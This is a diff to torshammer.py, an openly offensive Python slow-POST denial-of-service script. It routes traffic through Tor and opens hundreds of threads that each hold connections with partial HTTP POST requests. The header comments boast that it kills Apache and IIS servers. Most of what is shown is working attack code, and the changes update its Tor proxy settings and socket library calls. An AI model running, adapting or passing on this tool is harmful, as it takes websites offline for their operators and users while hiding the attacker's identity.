@@ -3,16 +3,13 @@
 # this assumes you have the socks.py (http://phiral.net/socks.py) 
 # and terminal.py (http://phiral.net/terminal.py) in the
 # same directory and that you have tor running locally 
-# on port 9050. run with 128 to 256 threads to be effective.
+# on port 9150. run with 128 to 256 threads to be effective.
 # kills apache 1.X with ~128, apache 2.X / IIS with ~256
 # not effective on nginx
 
-import os
-import re
 import time
 import sys
 import random
-import math
 import getopt
 import socks
 import string
@@ -49,6 +46,7 @@ useragents = [
  "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 ]
 
+
 class httpPost(Thread):
     def __init__(self, host, port, tor):
         Thread.__init__(self)
@@ -57,7 +55,7 @@ class httpPost(Thread):
         self.socks = socks.socksocket()
         self.tor = tor
         self.running = True
-		
+
     def _send_http_post(self, pause=10):
         global stop_now
 
@@ -67,7 +65,7 @@ class httpPost(Thread):
                         "Connection: keep-alive\r\n"
                         "Keep-Alive: 900\r\n"
                         "Content-Length: 10000\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
+                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                         (self.host, random.choice(useragents)))
 
         for i in range(0, 9999):
@@ -78,55 +76,55 @@ class httpPost(Thread):
             print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
-	
-        self.socks.close()
-		
+
+        # self.socks.close()
+
     def run(self):
         while self.running:
             while self.running:
                 try:
-                    if self.tor:     
-                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+                    if self.tor:
+                        self.socks.set_proxy(socks.SOCKS5, "localhost", 9150)
                     self.socks.connect((self.host, self.port))
                     print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                     break
                 except Exception, e:
-                    if e.args[0] == 106 or e.args[0] == 60:
-                        break
                     print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
+                    print e
                     time.sleep(1)
-                    continue
-	
+                    sys.exit()
+
             while self.running:
                 try:
                     self._send_http_post()
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
+                        print term.BOL + term.UP + term.CLEAR_EOL + "Thread broken, restarting..." + term.NORMAL
                         self.socks = socks.socksocket()
                         break
                     time.sleep(0.1)
                     pass
- 
+
+
 def usage():
     print "./torshammer.py -t <target> [-r <threads> -p <port> -T -h]"
     print " -t|--target <Hostname|IP>"
     print " -r|--threads <Number of threads> Defaults to 256"
     print " -p|--port <Web Server Port> Defaults to 80"
-    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
-    print " -h|--help Shows this help\n" 
+    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9150"
+    print " -h|--help Shows this help\n"
     print "Eg. ./torshammer.py -t 192.168.1.100 -r 256\n"
 
+
 def main(argv):
-    
     try:
         opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
     except getopt.GetoptError:
-        usage() 
+        usage()
         sys.exit(-1)
 
     global stop_now
-	
+
     target = ''
     threads = 256
     tor = False
@@ -180,4 +178,3 @@ if __name__ == "__main__":
     print " */\n"
 
     main(sys.argv[1:])
-
